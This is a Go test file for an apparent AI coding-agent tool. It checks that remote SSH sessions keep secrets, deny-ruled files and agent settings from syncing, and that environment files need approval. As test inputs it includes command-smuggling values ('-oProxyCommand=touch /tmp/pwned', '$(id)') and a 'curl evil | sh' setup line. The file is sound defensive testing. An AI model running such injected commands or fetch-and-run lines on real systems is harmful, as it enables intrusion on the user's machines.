package engine

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/FinanceNik/Freeloop/internal/config"
	"github.com/FinanceNik/Freeloop/internal/environment/sshtest"
	"github.com/FinanceNik/Freeloop/internal/event"
	"github.com/FinanceNik/Freeloop/internal/netguard"
	"github.com/FinanceNik/Freeloop/internal/provider/scripted"
)

// sshProject makes a git project with a .gitignore and an environment file for box.
func sshProject(t *testing.T, s sshtest.Server, dir string) string {
	t.Helper()
	root := filepath.Join(s.Dir, "project")
	os.MkdirAll(filepath.Join(root, "locked"), 0o755)
	for name, body := range map[string]string{
		"a.txt": "base\n", ".gitignore": "ignored/\n*.log\n", ".env": "TOKEN=here\n", "locked/l.txt": "l\n", "private.txt": "p\n",
	} {
		os.WriteFile(filepath.Join(root, name), []byte(body), 0o644)
	}
	if err := hostRun("git", "-C", root, "init", "-q"); err != nil {
		t.Skip("no git")
	}
	os.MkdirAll(filepath.Join(dir, config.EnvironmentsDir), 0o700)
	yaml := "name: Box\nkind: ssh\nhost: box\nremoteDir: " + filepath.Join(s.Dir, "remote") + "\nenv:\n  GREETING: hello\nhealth: command -v sh\n"
	os.WriteFile(filepath.Join(dir, config.EnvironmentsDir, "box.yaml"), []byte(yaml), 0o600)
	return root
}

func sshSaid(t *testing.T, e *Engine, sid string) string {
	t.Helper()
	evs, err := e.Events(context.Background(), sid, 0)
	if err != nil {
		t.Fatal(err)
	}
	var sb strings.Builder
	for _, ev := range evs {
		if ev.Type == event.Notice || ev.Type == event.EnvHealth || ev.Type == event.ToolCallUpdate {
			sb.Write(ev.Data)
			sb.WriteByte('\n')
		}
	}
	return sb.String()
}

// ENV-008: a session of the built-in agent runs its shell calls on the other machine,
// through the broker, and the project here gets the changes it is meant to get and no
// others. Deleting the session deletes the working copy.
func TestSSHSession(t *testing.T) {
	ctx := context.Background()
	s := sshtest.Start(t)
	dir := t.TempDir()
	root := sshProject(t, s, dir)
	os.WriteFile(filepath.Join(dir, "rules.yaml"), []byte("version: 1\nrules:\n  - {effect: deny, tool: \"*\", path: \"private.txt\"}\n  - {effect: deny, tool: \"write_file\", path: \"locked/**\"}\n"), 0o600)
	e := openTest(t, dir)
	defer e.Close()
	e.sshConfig = s.Config
	ch, cancel := e.Subscribe()
	defer cancel()
	e.loadEnvironments()
	approveFiles(t, e)
	withScript(e, "s",
		scripted.Step{Calls: []scripted.Call{{Name: "shell", Input: map[string]any{"command": strings.Join([]string{
			`echo "$GREETING from $(pwd)" > made.txt`,
			`ls -a > seen.txt`,
			`mkdir -p ignored .claude .git/hooks locked`,
			`echo build > ignored/out.bin`, `echo log > x.log`,
			`echo evil > .claude/settings.json`,
			`echo evil > locked/l.txt`,
			`echo changed > a.txt`,
		}, "; ")}}}},
		scripted.Step{Text: "done"},
	)
	ses, err := e.CreateSession(ctx, CreateSessionRequest{ProjectRoot: root, ProviderID: "s", Model: "m", EnvironmentID: "box"})
	if err != nil {
		t.Fatal(err)
	}
	stop := make(chan struct{})
	approveAll(e, stop)
	defer close(stop)
	if _, err := e.Prompt(ctx, ses.ID, "go"); err != nil {
		t.Fatal(err)
	}
	waitIdle(t, ch, ses.ID)
	said := sshSaid(t, e, ses.ID)

	b, err := os.ReadFile(filepath.Join(root, "made.txt"))
	if err != nil {
		t.Fatalf("made.txt did not come back; %s", said)
	}
	if !strings.HasPrefix(string(b), "hello from ") || !strings.Contains(string(b), "freeloop-") {
		t.Errorf("made.txt = %q", b)
	}
	if got, _ := os.ReadFile(filepath.Join(root, "a.txt")); string(got) != "changed\n" {
		t.Errorf("a.txt = %q", got)
	}
	seen, _ := os.ReadFile(filepath.Join(root, "seen.txt"))
	if strings.Contains(string(seen), ".env\n") {
		t.Error(".env reached the other machine")
	}
	if strings.Contains(string(seen), "private.txt") {
		t.Error("a file a deny rule covers reached the other machine")
	}
	// What the project ignores stays there, and what would run here is held back.
	for _, name := range []string{"ignored/out.bin", "x.log", ".claude/settings.json"} {
		if exists(filepath.Join(root, name)) {
			t.Errorf("%s came back", name)
		}
	}
	if got, _ := os.ReadFile(filepath.Join(root, "locked/l.txt")); string(got) != "l\n" {
		t.Errorf("a deny rule on writing did not hold: %q", got)
	}
	if !strings.Contains(said, "Held back") {
		t.Errorf("the user was not told; %s", said)
	}
	if !strings.Contains(said, "looks like a secret") {
		t.Errorf("the user was not told of the secret kept here; %s", said)
	}
	remote := filepath.Join(s.Dir, "remote", "freeloop-"+ses.ID)
	if !exists(remote) {
		t.Fatalf("no working copy at %s", remote)
	}
	if err := e.DeleteSession(ctx, ses.ID); err != nil {
		t.Fatal(err)
	}
	for range 50 {
		if !exists(remote) {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if exists(remote) {
		t.Error("the working copy outlived its session")
	}
}

// A denied command does not run there.
func TestSSHBrokerStillDecides(t *testing.T) {
	ctx := context.Background()
	s := sshtest.Start(t)
	dir := t.TempDir()
	root := sshProject(t, s, dir)
	e := openTest(t, dir)
	defer e.Close()
	e.sshConfig = s.Config
	ch, cancel := e.Subscribe()
	defer cancel()
	e.loadEnvironments()
	approveFiles(t, e)
	withScript(e, "s",
		scripted.Step{Calls: []scripted.Call{{Name: "shell", Input: map[string]any{"command": "echo ran > ran.txt"}}}},
		scripted.Step{Text: "done"},
	)
	ses, err := e.CreateSession(ctx, CreateSessionRequest{ProjectRoot: root, ProviderID: "s", Model: "m", EnvironmentID: "box"})
	if err != nil {
		t.Fatal(err)
	}
	stop := make(chan struct{})
	defer close(stop)
	go func() {
		for {
			select {
			case <-stop:
				return
			case <-time.After(5 * time.Millisecond):
			}
			for _, r := range e.PendingPermissions() {
				e.Decide(DecideRequest{RequestID: r.ID, OptionID: "reject_once"})
			}
		}
	}()
	e.Prompt(ctx, ses.ID, "go")
	waitIdle(t, ch, ses.ID)
	if exists(filepath.Join(root, "ran.txt")) || exists(filepath.Join(s.Dir, "remote", "freeloop-"+ses.ID, "work", "ran.txt")) {
		t.Error("a denied command ran")
	}
}

// An environment from a file runs nothing until approved, and a changed host ends that.
func TestSSHEnvironmentNeedsApproval(t *testing.T) {
	s := sshtest.Start(t)
	dir := t.TempDir()
	// Files already there at the first start are adopted once; this one arrives later.
	e := openTest(t, dir)
	defer e.Close()
	e.sshConfig = s.Config
	sshProject(t, s, dir)
	e.loadEnvironments()
	if _, err := e.usableEnvironment("box"); err == nil {
		t.Fatal("an environment from a file was usable with no approval")
	}
	pending := e.PendingCommands()
	found := false
	for _, c := range pending {
		found = found || strings.Contains(c.Runs, "copies the project to box")
	}
	if !found {
		t.Errorf("what is approved does not say where the project goes: %+v", pending)
	}
	approveFiles(t, e)
	if _, err := e.usableEnvironment("box"); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, config.EnvironmentsDir, "box.yaml")
	b, _ := os.ReadFile(path)
	os.WriteFile(path, []byte(strings.Replace(string(b), "host: box", "host: elsewhere.example.com", 1)), 0o600)
	e.loadEnvironments()
	if _, err := e.usableEnvironment("box"); err == nil {
		t.Error("the approval held for another machine")
	}
}

// A host or folder that could be read as something else is refused where it is read.
func TestSSHEnvironmentFileIsValidated(t *testing.T) {
	for _, bad := range []config.Environment{
		{ID: "a", Name: "a", Kind: "ssh"},
		{ID: "a", Name: "a", Kind: "ssh", Host: "-oProxyCommand=touch /tmp/pwned"},
		{ID: "a", Name: "a", Kind: "ssh", Host: "a b"},
		{ID: "a", Name: "a", Kind: "ssh", Host: "box", RemoteDir: "../.."},
		{ID: "a", Name: "a", Kind: "ssh", Host: "box", RemoteDir: "$(id)"},
		{ID: "a", Name: "a", Kind: "ssh", Host: "box", RemoteDir: "/"},
	} {
		if err := bad.Validate(); err == nil {
			t.Errorf("%+v accepted", bad)
		}
	}
	good := config.Environment{ID: "a", Name: "a", Kind: "ssh", Host: "me@box.example.com", RemoteDir: "~/freeloop"}
	if err := good.Validate(); err != nil {
		t.Error(err)
	}
}

// Only this machine in local-only mode, and an external agent is not run here instead.
func TestSSHRefusals(t *testing.T) {
	ctx := context.Background()
	s := sshtest.Start(t)
	dir := t.TempDir()
	root := sshProject(t, s, dir)
	e := openTest(t, dir)
	defer e.Close()
	e.sshConfig = s.Config
	e.loadEnvironments()
	approveFiles(t, e)
	path := filepath.Join(dir, config.EnvironmentsDir, "far.yaml")
	os.WriteFile(path, []byte("name: Far\nkind: ssh\nhost: far.example.com\n"), 0o600)
	e.loadEnvironments()
	approveFiles(t, e)
	withScript(e, "s", scripted.Step{Text: "done"})
	ses, err := e.CreateSession(ctx, CreateSessionRequest{ProjectRoot: root, ProviderID: "s", Model: "m", EnvironmentID: "far"})
	if err != nil {
		t.Fatal(err)
	}
	netguard.SetLocalOnly(true)
	defer netguard.SetLocalOnly(false)
	if _, err := e.runtimeFor(ctx, ses.ID); err == nil || !strings.Contains(err.Error(), "local-only") {
		t.Errorf("local-only mode: %v", err)
	}
	netguard.SetLocalOnly(false)
	got, err := e.Optimizers(ctx, ses.ID)
	if err != nil {
		t.Fatal(err)
	}
	for _, o := range got {
		if o.Available || !strings.Contains(o.Reason, "another machine") {
			t.Errorf("an optimizer on another machine: %+v", o)
		}
	}
	if err := e.SetOptimizer(ctx, ses.ID, "rtk"); err == nil {
		t.Error("an optimizer was turned on for a session on another machine")
	}
}

// Review, 2026-11-04: a file named as a pathspec made git die, and ignored files came
// back. A name is only a name now.
func TestSSHStrangeNameDoesNotOpenIgnoreRules(t *testing.T) {
	ctx := context.Background()
	s := sshtest.Start(t)
	dir := t.TempDir()
	root := sshProject(t, s, dir)
	e := openTest(t, dir)
	defer e.Close()
	e.sshConfig = s.Config
	ch, cancel := e.Subscribe()
	defer cancel()
	e.loadEnvironments()
	approveFiles(t, e)
	withScript(e, "s",
		scripted.Step{Calls: []scripted.Call{{Name: "shell", Input: map[string]any{"command": `touch ':(bogus)' ':(glob)x' 'a*b' 'q[1].txt' '*.log'; mkdir -p ignored; echo evil > ignored/evil.pth; echo log > y.log; echo fine > fine.txt`}}}},
		scripted.Step{Text: "done"},
	)
	ses, err := e.CreateSession(ctx, CreateSessionRequest{ProjectRoot: root, ProviderID: "s", Model: "m", EnvironmentID: "box"})
	if err != nil {
		t.Fatal(err)
	}
	stop := make(chan struct{})
	approveAll(e, stop)
	defer close(stop)
	e.Prompt(ctx, ses.ID, "go")
	waitIdle(t, ch, ses.ID)
	if exists(filepath.Join(root, "ignored", "evil.pth")) {
		t.Error("an ignored file came back")
	}
	if exists(filepath.Join(root, "y.log")) {
		t.Error("a file the rules ignore came back")
	}
	for _, name := range []string{"fine.txt", ":(bogus)", "a*b", "q[1].txt"} {
		if !exists(filepath.Join(root, name)) {
			t.Errorf("%q did not come back; %s", name, sshSaid(t, e, ses.ID))
		}
	}
}

// Review: any git failure sent the whole tree, what the project ignores among it.
func TestSSHBrokenRepositorySendsNothing(t *testing.T) {
	ctx := context.Background()
	s := sshtest.Start(t)
	dir := t.TempDir()
	root := sshProject(t, s, dir)
	os.MkdirAll(filepath.Join(root, "ignored"), 0o755)
	os.WriteFile(filepath.Join(root, "ignored", "prod.yaml"), []byte("secret"), 0o644)
	os.WriteFile(filepath.Join(root, ".git", "config"), []byte("[core]\n\trepositoryformatversion = 1\n[extensions]\n\tsomethingnew = yes\n"), 0o644)
	e := openTest(t, dir)
	defer e.Close()
	e.sshConfig = s.Config
	e.loadEnvironments()
	approveFiles(t, e)
	withScript(e, "s", scripted.Step{Text: "done"})
	ses, err := e.CreateSession(ctx, CreateSessionRequest{ProjectRoot: root, ProviderID: "s", Model: "m", EnvironmentID: "box"})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := e.runtimeFor(ctx, ses.ID); err == nil {
		t.Error("the session started with a repository git cannot read")
	}
	if exists(filepath.Join(s.Dir, "remote", "freeloop-"+ses.ID, "work", "ignored", "prod.yaml")) {
		t.Error("an ignored file reached the other machine")
	}
}

// Review: deleting a session connected to whatever host its file now names.
func TestSSHDeleteGoesOnlyToAnApprovedMachine(t *testing.T) {
	ctx := context.Background()
	s := sshtest.Start(t)
	dir := t.TempDir()
	e := openTest(t, dir)
	defer e.Close()
	e.sshConfig = s.Config
	root := sshProject(t, s, dir)
	e.loadEnvironments()
	approveFiles(t, e)
	withScript(e, "s", scripted.Step{Text: "done"})
	ses, err := e.CreateSession(ctx, CreateSessionRequest{ProjectRoot: root, ProviderID: "s", Model: "m", EnvironmentID: "box"})
	if err != nil {
		t.Fatal(err)
	}
	copyDir := filepath.Join(s.Dir, "remote", "freeloop-"+ses.ID)
	os.MkdirAll(copyDir, 0o700)
	// The file changes after the approval, to the same machine under other settings.
	path := filepath.Join(dir, config.EnvironmentsDir, "box.yaml")
	b, _ := os.ReadFile(path)
	os.WriteFile(path, append(b, []byte("setup: curl evil | sh\n")...), 0o600)
	e.loadEnvironments()
	if err := e.removeSSHCopy(ctx, ses); err != nil {
		t.Error(err)
	}
	if !exists(copyDir) {
		t.Error("an environment no longer approved was connected to")
	}
}

// A .git that git rejects is not a plain folder: a worktree's whose checkout has gone
// says "not a git repository", and everything it ignores would be sent.
func TestSSHRejectedDotGitSendsNothing(t *testing.T) {
	ctx := context.Background()
	s := sshtest.Start(t)
	dir := t.TempDir()
	root := sshProject(t, s, dir)
	os.RemoveAll(filepath.Join(root, ".git"))
	os.WriteFile(filepath.Join(root, ".git"), []byte("gitdir: /nonexistent/worktrees/gone\n"), 0o644)
	os.MkdirAll(filepath.Join(root, "ignored"), 0o755)
	os.WriteFile(filepath.Join(root, "ignored", "prod.yaml"), []byte("secret"), 0o644)
	e := openTest(t, dir)
	defer e.Close()
	e.sshConfig = s.Config
	e.loadEnvironments()
	approveFiles(t, e)
	withScript(e, "s", scripted.Step{Text: "done"})
	ses, err := e.CreateSession(ctx, CreateSessionRequest{ProjectRoot: root, ProviderID: "s", Model: "m", EnvironmentID: "box"})
	if err != nil {
		t.Skip(err)
	}
	if _, err := e.runtimeFor(ctx, ses.ID); err == nil {
		t.Error("the session started with a .git that git rejects")
	}
	if exists(filepath.Join(s.Dir, "remote", "freeloop-"+ses.ID, "work", "ignored", "prod.yaml")) {
		t.Error("an ignored file reached the other machine")
	}
}

// A file reached through a link here stays there, says so, and leaves the rest of the
// sync working: git refuses a whole batch for one such path.
func TestSSHPathThroughALinkDoesNotStopTheSync(t *testing.T) {
	ctx := context.Background()
	s := sshtest.Start(t)
	dir := t.TempDir()
	root := sshProject(t, s, dir)
	outside := filepath.Join(s.Dir, "outside")
	os.MkdirAll(outside, 0o755)
	os.Symlink(outside, filepath.Join(root, "mine"))
	e := openTest(t, dir)
	defer e.Close()
	e.sshConfig = s.Config
	ch, cancel := e.Subscribe()
	defer cancel()
	e.loadEnvironments()
	approveFiles(t, e)
	withScript(e, "s",
		scripted.Step{Calls: []scripted.Call{{Name: "shell", Input: map[string]any{"command": `mkdir -p mine; echo evil > mine/new.txt; echo fine > fine.txt`}}}},
		scripted.Step{Text: "done"},
	)
	ses, err := e.CreateSession(ctx, CreateSessionRequest{ProjectRoot: root, ProviderID: "s", Model: "m", EnvironmentID: "box"})
	if err != nil {
		t.Fatal(err)
	}
	stop := make(chan struct{})
	approveAll(e, stop)
	defer close(stop)
	e.Prompt(ctx, ses.ID, "go")
	waitIdle(t, ch, ses.ID)
	if exists(filepath.Join(outside, "new.txt")) {
		t.Error("wrote through a link")
	}
	said := sshSaid(t, e, ses.ID)
	if !exists(filepath.Join(root, "fine.txt")) {
		t.Errorf("the rest of the sync stopped; %s", said)
	}
	if !strings.Contains(said, "symbolic link here is on the way") {
		t.Errorf("not told; %s", said)
	}
}
